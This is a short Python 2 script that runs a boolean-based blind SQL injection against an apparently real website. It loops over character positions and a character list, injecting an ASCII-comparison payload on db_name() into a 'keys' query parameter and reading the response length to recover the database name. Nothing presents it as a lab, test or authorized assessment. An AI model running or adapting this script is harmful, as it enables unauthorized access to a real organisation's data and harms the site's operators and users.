#!/usr/bin/env python



# -*- coding: utf-8 -*-

import requests

import re

import time





payloads='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'

#payloads='abcdefqrstuvwxyj'





user=''



print 'Start to retrive current database:'





for i in range(1,9):



    for payload in payloads:



        #starttime=time.time()



        s="%%'and (ascii(substring(db_name(),%s,1)))=%s and '%%'='" %(i,ord(payload))



        param={'keys':s}



        response=requests.get('https://www.haochedai.com/index.php?user&q=reg&type=sendemail&checkemail=admin',params=param)

        response=response.text              

        #print response

        #print len(response)

        



        if len(response)>13000:

            user+=payload

            print '\n user is:',user,

            break

        else:

            print '.',





print '\n[Done] current database is %s' %user
